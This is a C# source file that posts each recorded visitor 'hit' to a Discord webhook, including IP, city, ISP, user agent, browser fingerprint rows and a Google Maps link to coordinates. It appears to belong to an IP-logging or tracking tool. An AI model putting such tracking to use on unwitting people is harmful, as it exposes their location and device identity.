using System.Text.Json;
using System.Text.Json.Nodes;

namespace Swivel.Core;

/// <summary>Discord webhook embeds for each recorded hit.</summary>
public static class Notify
{
    const int ColorHigh = 0xFF3B30;
    const int ColorMedium = 0xFFAA00;
    const int ColorLow = 0x00FF88;

    const int RiskHigh = 60;
    const int RiskMedium = 25;

    /// <summary>Post one embed. Never throws: delivery is best effort.</summary>
    public static async Task PostAsync(string? webhook, Hit hit, IpInfo info)
    {
        if (string.IsNullOrWhiteSpace(webhook))
            return;
        try
        {
            var fields = new JsonArray
            {
                Field("IP", $"`{hit.Ip}`", true),
                Field("Loc", $"{hit.Flag} {info.City}", true),
                Field("Risk", $"**{hit.Risk}/100**", true),
                Field("Tags", $"**{hit.Tags}**", false),
                Field("AB", $"**{(hit.AdBlock ? "yes" : "no")}**", true),
                Field("OS", $"{hit.Os}/{hit.Browser}", true),
                Field("ISP", Clip(info.Isp, 100), true),
                Field("UA", Clip(hit.UserAgent.Length == 0 ? "?" : hit.UserAgent, 500), false),
            };

            var rows = Payload.Rows(hit.Fingerprint);
            if (rows.Count > 0)
            {
                var dump = string.Concat(rows.Take(20).Select(r => $"`{r.Label}`: {r.Value}\n"));
                fields.Add(Field("\U0001F52C Browser Fingerprint", Clip(dump, 1024), false));
            }
            if (info.Latitude is not null && info.Longitude is not null)
            {
                fields.Add(Field("Map",
                    $"[gmaps](https://www.google.com/maps?q={info.Latitude},{info.Longitude})",
                    false));
            }

            var embed = new JsonObject
            {
                ["title"] = "hit",
                ["description"] = $"**{hit.Ip}** - {hit.Flag} {info.City}",
                ["color"] = Colour(hit.Risk),
                ["fields"] = fields,
                ["footer"] = new JsonObject { ["text"] = $"{hit.Timestamp} - swivel" },
            };

            var envelope = new JsonObject { ["embeds"] = new JsonArray(embed) };
            await Net.PostJsonAsync(webhook, envelope.ToJsonString()).ConfigureAwait(false);
        }
        catch (Exception ex) when (ex is HttpRequestException or TaskCanceledException
                                      or JsonException or UriFormatException)
        {
            // Bad webhook, offline, or rate limited - drop the notification.
        }
    }

    static int Colour(int risk) => risk >= RiskHigh ? ColorHigh
        : risk >= RiskMedium ? ColorMedium
        : ColorLow;

    static JsonObject Field(string name, string value, bool inline) => new()
    {
        ["name"] = name,
        ["value"] = value,
        ["inline"] = inline,
    };

    static string Clip(string text, int width) => text.Length > width ? text[..width] : text;
}